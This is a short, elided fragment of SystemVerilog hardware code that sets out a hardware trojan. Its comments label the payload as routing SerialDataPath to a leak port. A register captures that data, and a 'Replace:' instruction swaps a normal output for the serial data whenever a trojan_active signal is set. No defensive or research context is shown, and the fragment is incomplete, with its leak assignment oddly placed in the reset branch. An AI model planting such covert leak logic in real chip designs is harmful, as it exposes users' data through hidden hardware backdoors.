 ...
 * Payload: Route SerialDataPath to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= SerialDataPath;
    end
end
...
// ============================================================
// Information Leak: Route SerialDataPath to unused output
//
...
//   Replace: assign output_signal = trojan_active ? SerialDataPath : normal_value;